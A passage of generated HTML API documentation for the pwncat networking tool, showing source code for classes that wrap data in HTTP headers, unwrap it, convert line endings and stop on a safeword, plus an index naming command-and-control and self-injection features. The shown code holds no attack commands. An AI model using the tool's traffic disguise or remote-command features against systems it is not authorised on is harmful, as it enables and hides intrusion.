                                    class="hljs-string">"Sat"</span>, <span class="hljs-string">"Sun"</span>][now.weekday()]
        month = [
            <span class="hljs-string">"Jan"</span>,
            <span class="hljs-string">"Feb"</span>,
            <span class="hljs-string">"Mar"</span>,
            <span class="hljs-string">"Apr"</span>,
            <span class="hljs-string">"May"</span>,
            <span class="hljs-string">"Jun"</span>,
            <span class="hljs-string">"Jul"</span>,
            <span class="hljs-string">"Aug"</span>,
            <span class="hljs-string">"Sep"</span>,
            <span class="hljs-string">"Oct"</span>,
            <span class="hljs-string">"Nov"</span>,
            <span class="hljs-string">"Dec"</span>,
        ][now.month - <span class="hljs-number">1</span>]
        <span class="hljs-keyword">return</span> <span class="hljs-string">"%s, %02d %s %04d %02d:%02d:%02d GMT"</span> % (
            weekday,
            now.day,
            month,
            now.year,
            now.hour,
            now.minute,
            now.second,
        )</code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.Transform"
                               title="pwncat.Transform">Transform</a>
                        </li>
                        <li>abc.ABC</li>
                    </ul>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.TransformHttpPack.transform"><code class="name flex">
                            <span>def <span
                                    class="ident">transform</span></span>(<span>self, data)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Wrap data into a HTTP packet.</p>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>bytes</code></dt>
                                    <dd>The wrapped string.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">transform</span>(<span
                                        class="hljs-params">self, data</span>):</span>
    <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
    <span class="hljs-string">"""Wrap data into a HTTP packet.

    Returns:
        bytes: The wrapped string.
    """</span>
    request_header = [
        <span class="hljs-string">"POST / HTTP/1.1"</span>,
        <span class="hljs-string">"Host: {}"</span>.format(self.__opts[<span class="hljs-string">"host"</span>]),
        <span class="hljs-string">"User-Agent: pwncat"</span>,
        <span class="hljs-string">"Accept: */*"</span>,
        <span class="hljs-string">"Conent-Length: {}"</span>.format(len(data)),
        <span class="hljs-string">"Content-Type: text/plain; charset=UTF-8"</span>,
    ]
    response_header = [
        <span class="hljs-string">"HTTP/1.1 200 OK"</span>,
        <span class="hljs-string">"Date: {}"</span>.format(self.__get_date()),
        <span class="hljs-string">"Server: pwncat"</span>,
        <span class="hljs-string">"Conent-Length: {}"</span>.format(len(data)),
        <span class="hljs-string">"Connection: close"</span>,
    ]

    self.__response_headers_sent = <span class="hljs-literal">True</span>

    <span class="hljs-keyword">if</span> self.__opts[<span
                                            class="hljs-string">"reply"</span>] == <span
                                            class="hljs-string">"request"</span>:
        header = StringEncoder.encode(
            <span class="hljs-string">"\n"</span>.join(request_header) + <span class="hljs-string">"\n"</span> + <span
                                            class="hljs-string">"\n"</span>.join(self.__headers) + <span
                                            class="hljs-string">"\n\n"</span>
        )
    <span class="hljs-keyword">else</span>:
        header = StringEncoder.encode(
            <span class="hljs-string">"\n"</span>.join(response_header) + <span class="hljs-string">"\n"</span> + <span
                                            class="hljs-string">"\n"</span>.join(self.__headers) + <span
                                            class="hljs-string">"\n\n"</span>
        )
    <span class="hljs-keyword">return</span> header + data</code></pre>
                            </details>
                        </dd>
                    </dl>
                    <h3>Inherited members</h3>
                    <ul class="hlist">
                        <li><code><b><a href="https://pwncat.org/pwncat.api.html#pwncat.Transform"
                                        title="pwncat.Transform">Transform</a></b></code>:
                            <ul class="hlist">
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.Transform.log"
                                        title="pwncat.Transform.log">log</a></code>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </dd>
                <dt id="pwncat.TransformHttpUnpack"><code class="flex name class">
                    <span>class <span class="ident">TransformHttpUnpack</span></span>
                    <span>(</span><span>opts)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Implement a transformation to unpack data from HTTP
                        packets.</p>
                        <p>Set specific options for this transformer.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>opts</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsTransformLinefeed"
                                    title="pwncat.DsTransformLinefeed">DsTransformLinefeed</a></code>
                            </dt>
                            <dd>Transformer options.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">TransformHttpUnpack</span>(<span
                                class="hljs-params">Transform</span>):</span>
    <span class="hljs-string">"""Implement a transformation to unpack data from HTTP packets."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, opts</span>):</span>
        <span class="hljs-comment"># type: (Dict[str, str]) -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this transformer.

        Args:
            opts (DsTransformLinefeed): Transformer options.

        """</span>
        super(TransformHttpUnpack, self).__init__()
        self.__opts = opts
        self.__log = logging.getLogger(__name__)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transform</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
        <span class="hljs-string">"""Unwrap data from a HTTP packet.

        Returns:
            str: The wrapped string.
        """</span>
        request = StringEncoder.encode(<span class="hljs-string">r"^(GET|HEAD|POST|PUT|DELETE|CONNECT|OPTIONS|TRACE|PATCH)"</span>)
        response = StringEncoder.encode(<span class="hljs-string">r"^HTTP/[.0-9]+"</span>)

        <span class="hljs-comment"># Did not receive a valid HTTP request, so we return the original untransformed message</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (re.match(request, data) <span
                                    class="hljs-keyword">or</span> re.match(response, data)):
            <span class="hljs-keyword">return</span> data

        body = StringEncoder.encode(<span class="hljs-string">r"(\r\n\r\n|\n\n)(.*)"</span>)
        match = re.search(body, data)

        <span class="hljs-comment"># Check if we can separate headers and body</span>
        <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">or</span> len(match.group()) &lt; <span
                                    class="hljs-number">2</span>:
            <span class="hljs-keyword">return</span> data
        <span class="hljs-keyword">return</span> match.group(<span
                                    class="hljs-number">2</span>)</code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.Transform"
                               title="pwncat.Transform">Transform</a>
                        </li>
                        <li>abc.ABC</li>
                    </ul>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.TransformHttpUnpack.transform"><code class="name flex">
                            <span>def <span
                                    class="ident">transform</span></span>(<span>self, data)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Unwrap data from a HTTP packet.</p>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>str</code></dt>
                                    <dd>The wrapped string.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">transform</span>(<span
                                        class="hljs-params">self, data</span>):</span>
    <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
    <span class="hljs-string">"""Unwrap data from a HTTP packet.

    Returns:
        str: The wrapped string.
    """</span>
    request = StringEncoder.encode(<span class="hljs-string">r"^(GET|HEAD|POST|PUT|DELETE|CONNECT|OPTIONS|TRACE|PATCH)"</span>)
    response = StringEncoder.encode(<span class="hljs-string">r"^HTTP/[.0-9]+"</span>)

    <span class="hljs-comment"># Did not receive a valid HTTP request, so we return the original untransformed message</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (re.match(request, data) <span
                                            class="hljs-keyword">or</span> re.match(response, data)):
        <span class="hljs-keyword">return</span> data

    body = StringEncoder.encode(<span class="hljs-string">r"(\r\n\r\n|\n\n)(.*)"</span>)
    match = re.search(body, data)

    <span class="hljs-comment"># Check if we can separate headers and body</span>
    <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                                            class="hljs-literal">None</span> <span
                                            class="hljs-keyword">or</span> len(match.group()) &lt; <span
                                            class="hljs-number">2</span>:
        <span class="hljs-keyword">return</span> data
    <span class="hljs-keyword">return</span> match.group(<span class="hljs-number">2</span>)</code></pre>
                            </details>
                        </dd>
                    </dl>
                    <h3>Inherited members</h3>
                    <ul class="hlist">
                        <li><code><b><a href="https://pwncat.org/pwncat.api.html#pwncat.Transform"
                                        title="pwncat.Transform">Transform</a></b></code>:
                            <ul class="hlist">
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.Transform.log"
                                        title="pwncat.Transform.log">log</a></code>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </dd>
                <dt id="pwncat.TransformLinefeed"><code class="flex name class">
                    <span>class <span class="ident">TransformLinefeed</span></span>
                    <span>(</span><span>opts)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Implement basic linefeed replacement.</p>
                        <p>Set specific options for this transformer.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>opts</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsTransformLinefeed"
                                    title="pwncat.DsTransformLinefeed">DsTransformLinefeed</a></code>
                            </dt>
                            <dd>Transformer options.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">TransformLinefeed</span>(<span
                                class="hljs-params">Transform</span>):</span>
    <span class="hljs-string">"""Implement basic linefeed replacement."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, opts</span>):</span>
        <span class="hljs-comment"># type: (DsTransformLinefeed) -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this transformer.

        Args:
            opts (DsTransformLinefeed): Transformer options.

        """</span>
        super(TransformLinefeed, self).__init__()
        self.__opts = opts

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transform</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
        <span class="hljs-string">"""Transform linefeeds to CRLF, LF or CR if requested.

        Returns:
            str: The string with altered linefeeds.
        """</span>
        <span class="hljs-comment"># 'auto' keep it as it is</span>
        <span class="hljs-keyword">if</span> self.__opts.crlf <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> data

        <span class="hljs-comment"># ? -&gt; No line feeds</span>
        <span class="hljs-keyword">if</span> self.__opts.crlf == <span
                                    class="hljs-string">"no"</span>:
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-2</span>:] == StringEncoder.encode(<span
                                    class="hljs-string">"\r\n"</span>):
                self.log.debug(<span class="hljs-string">"Removing CRLF"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-2</span>]
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                                    class="hljs-string">"\n"</span>):
                self.log.debug(<span class="hljs-string">"Removing LF"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>]
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                                    class="hljs-string">"\r"</span>):
                self.log.debug(<span class="hljs-string">"Removing CR"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>]
        <span class="hljs-comment"># ? -&gt; CRLF</span>
        <span class="hljs-keyword">if</span> self.__opts.crlf == <span
                                    class="hljs-string">"crlf"</span> <span
                                    class="hljs-keyword">and</span> data[<span class="hljs-number">-2</span>:] != StringEncoder.encode(<span
                                    class="hljs-string">"\r\n"</span>):
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                                    class="hljs-string">"\n"</span>):
                self.log.debug(<span class="hljs-string">"Replacing LF with CRLF"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>] + StringEncoder.encode(<span
                                    class="hljs-string">"\r\n"</span>)
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                                    class="hljs-string">"\r"</span>):
                self.log.debug(<span class="hljs-string">"Replacing CR with CRLF"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>] + StringEncoder.encode(<span
                                    class="hljs-string">"\r\n"</span>)
        <span class="hljs-comment"># ? -&gt; LF</span>
        <span class="hljs-keyword">if</span> self.__opts.crlf == <span
                                    class="hljs-string">"lf"</span>:
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-2</span>:] == StringEncoder.encode(<span
                                    class="hljs-string">"\r\n"</span>):
                self.log.debug(<span class="hljs-string">"Replacing CRLF with LF"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-2</span>] + StringEncoder.encode(<span
                                    class="hljs-string">"\n"</span>)
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                                    class="hljs-string">"\r"</span>):
                self.log.debug(<span class="hljs-string">"Replacing CR with LF"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>] + StringEncoder.encode(<span
                                    class="hljs-string">"\n"</span>)
        <span class="hljs-comment"># ? -&gt; CR</span>
        <span class="hljs-keyword">if</span> self.__opts.crlf == <span
                                    class="hljs-string">"cr"</span>:
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-2</span>:] == StringEncoder.encode(<span
                                    class="hljs-string">"\r\n"</span>):
                self.log.debug(<span class="hljs-string">"Replacing CRLF with CR"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-2</span>] + StringEncoder.encode(<span
                                    class="hljs-string">"\r"</span>)
            <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                                    class="hljs-string">"\n"</span>):
                self.log.debug(<span class="hljs-string">"Replacing LF with CR"</span>)
                <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>] + StringEncoder.encode(<span
                                    class="hljs-string">"\r"</span>)

        <span class="hljs-comment"># Otherwise just return it as it is</span>
        <span class="hljs-keyword">return</span> data</code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.Transform"
                               title="pwncat.Transform">Transform</a>
                        </li>
                        <li>abc.ABC</li>
                    </ul>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.TransformLinefeed.transform"><code class="name flex">
                            <span>def <span
                                    class="ident">transform</span></span>(<span>self, data)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Transform linefeeds to CRLF, LF or CR if
                                requested.</p>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>str</code></dt>
                                    <dd>The string with altered linefeeds.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">transform</span>(<span
                                        class="hljs-params">self, data</span>):</span>
    <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
    <span class="hljs-string">"""Transform linefeeds to CRLF, LF or CR if requested.

    Returns:
        str: The string with altered linefeeds.
    """</span>
    <span class="hljs-comment"># 'auto' keep it as it is</span>
    <span class="hljs-keyword">if</span> self.__opts.crlf <span class="hljs-keyword">is</span> <span
                                            class="hljs-literal">None</span>:
        <span class="hljs-keyword">return</span> data

    <span class="hljs-comment"># ? -&gt; No line feeds</span>
    <span class="hljs-keyword">if</span> self.__opts.crlf == <span class="hljs-string">"no"</span>:
        <span class="hljs-keyword">if</span> data[<span class="hljs-number">-2</span>:] == StringEncoder.encode(<span
                                            class="hljs-string">"\r\n"</span>):
            self.log.debug(<span class="hljs-string">"Removing CRLF"</span>)
            <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-2</span>]
        <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                                            class="hljs-string">"\n"</span>):
            self.log.debug(<span class="hljs-string">"Removing LF"</span>)
            <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>]
        <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                                            class="hljs-string">"\r"</span>):
            self.log.debug(<span class="hljs-string">"Removing CR"</span>)
            <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>]
    <span class="hljs-comment"># ? -&gt; CRLF</span>
    <span class="hljs-keyword">if</span> self.__opts.crlf == <span class="hljs-string">"crlf"</span> <span
                                            class="hljs-keyword">and</span> data[<span
                                            class="hljs-number">-2</span>:] != StringEncoder.encode(<span
                                            class="hljs-string">"\r\n"</span>):
        <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                                            class="hljs-string">"\n"</span>):
            self.log.debug(<span class="hljs-string">"Replacing LF with CRLF"</span>)
            <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>] + StringEncoder.encode(<span
                                            class="hljs-string">"\r\n"</span>)
        <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                                            class="hljs-string">"\r"</span>):
            self.log.debug(<span class="hljs-string">"Replacing CR with CRLF"</span>)
            <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>] + StringEncoder.encode(<span
                                            class="hljs-string">"\r\n"</span>)
    <span class="hljs-comment"># ? -&gt; LF</span>
    <span class="hljs-keyword">if</span> self.__opts.crlf == <span class="hljs-string">"lf"</span>:
        <span class="hljs-keyword">if</span> data[<span class="hljs-number">-2</span>:] == StringEncoder.encode(<span
                                            class="hljs-string">"\r\n"</span>):
            self.log.debug(<span class="hljs-string">"Replacing CRLF with LF"</span>)
            <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-2</span>] + StringEncoder.encode(<span
                                            class="hljs-string">"\n"</span>)
        <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                                            class="hljs-string">"\r"</span>):
            self.log.debug(<span class="hljs-string">"Replacing CR with LF"</span>)
            <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>] + StringEncoder.encode(<span
                                            class="hljs-string">"\n"</span>)
    <span class="hljs-comment"># ? -&gt; CR</span>
    <span class="hljs-keyword">if</span> self.__opts.crlf == <span class="hljs-string">"cr"</span>:
        <span class="hljs-keyword">if</span> data[<span class="hljs-number">-2</span>:] == StringEncoder.encode(<span
                                            class="hljs-string">"\r\n"</span>):
            self.log.debug(<span class="hljs-string">"Replacing CRLF with CR"</span>)
            <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-2</span>] + StringEncoder.encode(<span
                                            class="hljs-string">"\r"</span>)
        <span class="hljs-keyword">if</span> data[<span class="hljs-number">-1</span>:] == StringEncoder.encode(<span
                                            class="hljs-string">"\n"</span>):
            self.log.debug(<span class="hljs-string">"Replacing LF with CR"</span>)
            <span class="hljs-keyword">return</span> data[:<span class="hljs-number">-1</span>] + StringEncoder.encode(<span
                                            class="hljs-string">"\r"</span>)

    <span class="hljs-comment"># Otherwise just return it as it is</span>
    <span class="hljs-keyword">return</span> data</code></pre>
                            </details>
                        </dd>
                    </dl>
                    <h3>Inherited members</h3>
                    <ul class="hlist">
                        <li><code><b><a href="https://pwncat.org/pwncat.api.html#pwncat.Transform"
                                        title="pwncat.Transform">Transform</a></b></code>:
                            <ul class="hlist">
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.Transform.log"
                                        title="pwncat.Transform.log">log</a></code>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </dd>
                <dt id="pwncat.TransformSafeword"><code class="flex name class">
                    <span>class <span class="ident">TransformSafeword</span></span>
                    <span>(</span><span>opts)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Implement a trigger to emergency shutdown upon receival of
                        a specific safeword.</p>
                        <p>Set specific options for this transformer.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>opts</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsTransformLinefeed"
                                    title="pwncat.DsTransformLinefeed">DsTransformLinefeed</a></code>
                            </dt>
                            <dd>Transformer options.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">TransformSafeword</span>(<span
                                class="hljs-params">Transform</span>):</span>
    <span class="hljs-string">"""Implement a trigger to emergency shutdown upon receival of a specific safeword."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, opts</span>):</span>
        <span class="hljs-comment"># type: (DsTransformSafeword) -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this transformer.

        Args:
            opts (DsTransformLinefeed): Transformer options.

        """</span>
        super(TransformSafeword, self).__init__()
        self.__opts = opts
        self.__log = logging.getLogger(__name__)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transform</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
        <span class="hljs-string">"""Raise a stop signal upon receiving the safeword.

        Returns:
            str: The string as it is without changes
        """</span>
        <span class="hljs-keyword">if</span> StringEncoder.encode(self.__opts.safeword) <span
                                    class="hljs-keyword">in</span> data:
            self.log.trace(<span class="hljs-string">"TERMINATE signal RAISED in TransformSafeword.transform"</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
            self.__opts.ssig.raise_terminate()
        <span class="hljs-keyword">return</span> data</code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.Transform"
                               title="pwncat.Transform">Transform</a>
                        </li>
                        <li>abc.ABC</li>
                    </ul>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.TransformSafeword.transform"><code class="name flex">
                            <span>def <span
                                    class="ident">transform</span></span>(<span>self, data)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Raise a stop signal upon receiving the
                                safeword.</p>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>str</code></dt>
                                    <dd>The string as it is without changes</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">transform</span>(<span
                                        class="hljs-params">self, data</span>):</span>
    <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
    <span class="hljs-string">"""Raise a stop signal upon receiving the safeword.

    Returns:
        str: The string as it is without changes
    """</span>
    <span class="hljs-keyword">if</span> StringEncoder.encode(self.__opts.safeword) <span
                                            class="hljs-keyword">in</span> data:
        self.log.trace(<span class="hljs-string">"TERMINATE signal RAISED in TransformSafeword.transform"</span>)  <span
                                            class="hljs-comment"># type: ignore</span>
        self.__opts.ssig.raise_terminate()
    <span class="hljs-keyword">return</span> data</code></pre>
                            </details>
                        </dd>
                    </dl>
                    <h3>Inherited members</h3>
                    <ul class="hlist">
                        <li><code><b><a href="https://pwncat.org/pwncat.api.html#pwncat.Transform"
                                        title="pwncat.Transform">Transform</a></b></code>:
                            <ul class="hlist">
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.Transform.log"
                                        title="pwncat.Transform.log">log</a></code>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </dd>
            </dl>
        </section>
    </article>
    <nav id="sidebar">
        <h1>Index</h1>
        <div class="toc">
            <ul></ul>
        </div>
        <ul id="index">
            <li><h3><a href="https://pwncat.org/pwncat.api.html#header-functions">Functions</a></h3>
                <ul class="">
                    <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.get_args"
                                 title="pwncat.get_args">get_args</a></code>
                    </li>
                    <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.get_version"
                                 title="pwncat.get_version">get_version</a></code>
                    </li>
                    <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.main"
                                 title="pwncat.main">main</a></code>
                    </li>
                </ul>
            </li>
            <li><h3><a href="https://pwncat.org/pwncat.api.html#header-classes">Classes</a></h3>
                <ul>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.ArgValidator"
                                     title="pwncat.ArgValidator">ArgValidator</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ArgValidator.get_port_list_from_string"
                                    title="pwncat.ArgValidator.get_port_list_from_string">get_port_list_from_string</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ArgValidator.is_valid_port"
                                    title="pwncat.ArgValidator.is_valid_port">is_valid_port</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ArgValidator.is_valid_port_list"
                                    title="pwncat.ArgValidator.is_valid_port_list">is_valid_port_list</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ArgValidator.type_color"
                                    title="pwncat.ArgValidator.type_color">type_color</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ArgValidator.type_crlf"
                                    title="pwncat.ArgValidator.type_crlf">type_crlf</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ArgValidator.type_file_content"
                                    title="pwncat.ArgValidator.type_file_content">type_file_content</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ArgValidator.type_info"
                                    title="pwncat.ArgValidator.type_info">type_info</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ArgValidator.type_local"
                                    title="pwncat.ArgValidator.type_local">type_local</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ArgValidator.type_port"
                                    title="pwncat.ArgValidator.type_port">type_port</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ArgValidator.type_port_list"
                                    title="pwncat.ArgValidator.type_port_list">type_port_list</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ArgValidator.type_remote"
                                    title="pwncat.ArgValidator.type_remote">type_remote</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ArgValidator.type_self_inject"
                                    title="pwncat.ArgValidator.type_self_inject">type_self_inject</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ArgValidator.type_tos"
                                    title="pwncat.ArgValidator.type_tos">type_tos</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.CNC"
                                     title="pwncat.CNC">CNC</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.CNC.create_remote_tmpfile"
                                    title="pwncat.CNC.create_remote_tmpfile">create_remote_tmpfile</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.CNC.flush_receive"
                                    title="pwncat.CNC.flush_receive">flush_receive</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.CNC.print_info"
                                    title="pwncat.CNC.print_info">print_info</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.CNC.print_raw"
                                    title="pwncat.CNC.print_raw">print_raw</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.CNC.remote_command"
                                    title="pwncat.CNC.remote_command">remote_command</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.CNC.remote_file_exists"
                                    title="pwncat.CNC.remote_file_exists">remote_file_exists</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.CNC.remote_py3"
